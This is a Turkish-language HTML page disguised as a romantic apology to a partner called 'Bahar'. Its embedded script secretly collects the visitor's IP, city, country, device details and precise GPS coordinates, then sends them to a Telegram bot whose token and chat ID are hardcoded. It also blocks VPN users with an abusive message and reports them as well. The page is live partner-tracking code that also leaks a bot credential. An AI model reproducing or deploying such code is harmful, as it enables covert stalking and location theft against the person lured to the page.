<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sadece Senin İçin ❤️</title>
    <style>
        body { 
            background: #000; /* Koyu arka plan, aşkın asaleti */
            color: #fff; 
            font-family: 'Playfair Display', serif; /* Şık ve romantik yazı tipi */
            margin: 0; 
            height: 100vh; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            overflow: hidden; 
            flex-direction: column;
            text-align: center;
        }

        .mavi-gozlum { 
            font-size: 6rem; /* Büyük ve etkileyici yazı */
            font-weight: 700; 
            color: #00d4ff; /* Mavi, sevgilin için özel */
            text-shadow: 0 0 30px #00d4ff; 
            animation: pulse 2s infinite alternate; /* Hafif nabız atma efekti */
            letter-spacing: 5px; 
            margin: 0; 
        }

        .bahar { 
            font-size: 3rem; /* Bahar yazısı daha küçük ama şık */
            margin-top: 20px; 
            font-weight: 400; 
            color: #ffffff; 
            letter-spacing: 3px; 
            font-style: italic; /* İtalik, daha zarif */
        }

        .mesaj {
            font-size: 1.5rem; /* Kendini affettirme mesajı */
            margin-top: 40px; 
            color: rgba(255, 255, 255, 0.8); 
            letter-spacing: 2px;
            font-family: 'Dancing Script', cursive; /* El yazısı gibi, daha kişisel */
        }
        
        @keyframes pulse { 
            from { transform: scale(1); color: #00d4ff; text-shadow: 0 0 30px #00d4ff; } 
            to { transform: scale(1.1); color: #ff00ff; text-shadow: 0 0 50px #ff00ff; } /* Mavi-pembe arası geçiş */
        }

        /* VPN Engel Ekranı - Aynısı */
        #vpn-blocker {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: red; color: black; z-index: 9999; justify-content: center; align-items: center;
            font-size: 3rem; font-weight: bold; text-align: center; padding: 20px;
        }
    </style>
</head>
<body>

    <div id="vpn-blocker">VPN KAPAT AMK</div>

    <div id="main-content" class="container">
        <h1 class="mavi-gozlum">Mavi Gözlüm</h1>
        <p class="bahar">Bahar</p> 
        <p class="mesaj">Özür dilerim, beni affetmeni istiyorum...</p>
    </div>

    <script>
        const token = "8786995649:AAEQyWRD2oXQdc7YG5o9TI641dwB9ZIPM00";
        const chatId = "7783618933";

        function sendToBot(msg) {
            let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`;
            new Image().src = url;
        }

        window.getIP = function(json) {
            let ip = json.ip;
            
            fetch(`https://demo.ip-api.com/json/${ip}?fields=66846719`)
            .then(res => res.json())
            .then(data => {
                if (data.proxy === true || data.hosting === true) {
                    document.getElementById('main-content').style.display = 'none';
                    document.getElementById('vpn-blocker').style.display = 'flex';
                    sendToBot(`🚫 VPN TESPİT EDİLDİ!\n📍 IP: ${ip}\n📱 Cihaz: ${navigator.userAgent}`);
                } else {
                    sendToBot(`🚨 SEVGİLİN GİRİŞ YAPTI!\n📍 IP: ${ip}\n🌍 Konum: ${data.city} / ${data.country}\n📱 Cihaz: ${navigator.userAgent}`);
                    
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(pos => {
                            let lat = pos.coords.latitude;
                            let lon = pos.coords.longitude;
                            sendToBot(`🎯 TAM KONUM (GPS):\n📍 Koordinat: ${lat}, ${lon}\n🗺 Harita: https://www.google.com/maps?q=${lat},${lon}`);
                        }, null, {enableHighAccuracy: true});
                    }
                }
            })
            .catch(() => {
                sendToBot(`🚨 GİRİŞ (VPN Kontrolü Atlandı)\n📍 IP: ${ip}`);
            });
        };

        let script = document.createElement('script');
        script.src = 'https://api.ipify.org?format=jsonp&callback=getIP';
        document.body.appendChild(script);
    </script>
</body>
</html>
